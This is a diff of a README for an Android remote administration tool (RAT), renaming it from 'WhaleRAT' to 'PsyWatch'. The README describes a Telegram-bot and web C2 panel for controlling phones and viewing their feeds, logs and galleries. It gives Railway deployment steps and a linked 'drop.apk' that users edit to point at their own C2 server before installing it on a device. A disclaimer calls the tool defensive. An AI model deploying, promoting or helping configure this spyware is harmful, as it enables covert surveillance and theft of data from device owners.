@@ -1,12 +1,12 @@
 <div align="center">
-  <img src="images/logo.png" alt="WhaleRAT Logo" width="600" style="background: transparent;">
+  <img src="images/logo.png" alt="PsyWatch Logo" width="600" style="background: transparent;">
   
-  # WhaleRAT
+  # PsyWatch
   ### Telegram & Web-Based Android Remote Administration Tool
 
 <p align="center">
-<a href="https://github.com/psylligent/WhaleRAT/stargazers"><img src="https://img.shields.io/github/stars/psylligent/WhaleRAT?style=for-the-badge&logo=github&color=yellow" alt="Stars"/></a> <a href="https://github.com/psylligent/WhaleRAT/forks"><img src="https://img.shields.io/github/forks/psylligent/WhaleRAT?style=for-the-badge&logo=github&color=blue" alt="Forks"/></a>
-<img src="https://komarev.com/ghpvc/?username=psylligent&repo=WhaleRAT&style=for-the-badge&color=brightgreen&label=VIEWS" alt="Views"/>
+<a href="https://github.com/psylligent/PsyWatch/stargazers"><img src="https://img.shields.io/github/stars/psylligent/PsyWatch?style=for-the-badge&logo=github&color=yellow" alt="Stars"/></a> <a href="https://github.com/psylligent/PsyWatch/forks"><img src="https://img.shields.io/github/forks/psylligent/PsyWatch?style=for-the-badge&logo=github&color=blue" alt="Forks"/></a>
+<img src="https://komarev.com/ghpvc/?username=psylligent&repo=PsyWatch&style=for-the-badge&color=brightgreen&label=VIEWS" alt="Views"/>
 <img src="https://img.shields.io/badge/Node.js-%3E%3D20.0.0-brightgreen?style=for-the-badge&logo=node.js" alt="Node.js"/>
 <img src="https://img.shields.io/badge/Deploy-Railway-blueviolet?style=for-the-badge&logo=railway" alt="Railway"/>
 </p>
@@ -15,9 +15,9 @@
 ---
 
 
-## 🐋 What is WhaleRAT?
+## 🐋 What is PsyWatch?
 
-**WhaleRAT is a A powerful Android RAT developed for defensive security testing and no port forwarding. Maintained by psylligent**
+**PsyWatch is a A powerful Android RAT developed for defensive security testing and no port forwarding. Maintained by psylligent**
 
 1. **Telegram Bot** — issue commands, receive data, and get real-time alerts directly inside Telegram.
 2. **Web Dashboard (C2 Panel)** — a full-featured browser-based UI for managing multiple devices simultaneously, viewing live feeds, logs, galleries, and more.
@@ -85,7 +85,7 @@
 └─────────────────────────────────────┘
                                         │
                                ┌────────▼──────────────────────┐
-                               │   WhaleRAT Server (Node.js)    │
+                               │   PsyWatch Server (Node.js)    │
                                │                                │
                                │  ┌─────────┐  ┌────────────┐  │
                                │  │ Express │  │  WS Server │  │
@@ -137,7 +137,7 @@
 ## 📂 Project Structure
 
 ```
-WhaleRAT-main/
+PsyWatch-main/
 ├── server.js          # Main C2 server — Express, WebSocket, Telegram bot
 ├── config.json        # Bot token, admin IDs, port, credentials
 ├── package.json       # Dependencies & npm scripts
@@ -188,7 +188,7 @@ Edit **`config.json`** before deploying:
 
 ## 🚂 Deploy to Railway
 
-Railway is the easiest way to get WhaleRAT running on a public URL — no server setup, no port forwarding.
+Railway is the easiest way to get PsyWatch running on a public URL — no server setup, no port forwarding.
 
 ### Step 1 — Create a Railway account
 
@@ -215,14 +215,14 @@ The APK needs to point to **your** Railway URL before you install it on a device
 ### How to edit the APK with MT Manager:
 
 1. **Download [MT Manager](https://github.com/Yau08/MT-Manager/releases/download/v2.14.5/MT-Manager_2.14.5_v8a.apk)** and install it on your Android device
-2. Copy **[drop.apk](https://github.com/psylligent/WhaleRAT/raw/refs/heads/main/app/drop.apk)** to your Android device
+2. Copy **[drop.apk](https://github.com/psylligent/PsyWatch/raw/refs/heads/main/app/drop.apk)** to your Android device
 3. Open **MT Manager** → navigate to `drop.apk` → tap it → choose **"View"**
 4. Inside the APK, find and open the file **`assets/config.json`**
 5. You'll see this:
 
    ```json
    {
-     "server_url": "https://whalerat-production.up.railway.app/",
+     "server_url": "https://psywatch-production.up.railway.app/",
      "webview_url": "https://google.com/"
    }
    ```
@@ -236,7 +236,7 @@ The APK needs to point to **your** Railway URL before you install it on a device
 
 ### Step 6 — Verify deployment
 
-Visit `https://your-app.up.railway.app` — you should see the WhaleRAT login page.  
+Visit `https://your-app.up.railway.app` — you should see the PsyWatch login page.  
 Send `/start` to your Telegram bot to verify it's polling correctly.
 
 
@@ -305,14 +305,14 @@ The web panel is accessible at `https://your-domain/` after logging in at `/logi
 
 | Channel | Where |
 |---|---|
-| 🐋 **Repository** | [github.com/psylligent/WhaleRAT](https://github.com/psylligent/WhaleRAT) |
+| 🐋 **Repository** | [github.com/psylligent/PsyWatch](https://github.com/psylligent/PsyWatch) |
 
 ---
 
 ## 🛑 Disclaimer & Legal Warning
 
 > [!CAUTION]
-> **Whale RAT is intended exclusively for authorized security research, academic studies, and defensive engineering.**
+> **PsyWatch is intended exclusively for authorized security research, academic studies, and defensive engineering.**
 >
 > Using this software against targets without explicit, prior, written consent is **strictly illegal** and subject to severe criminal liability under applicable law (CFAA, Computer Misuse Act, IT Act, etc.). The developers assume **zero responsibility** for misuse, damage, or malicious actions executed via this codebase. **You are solely responsible for how you use it.**
 
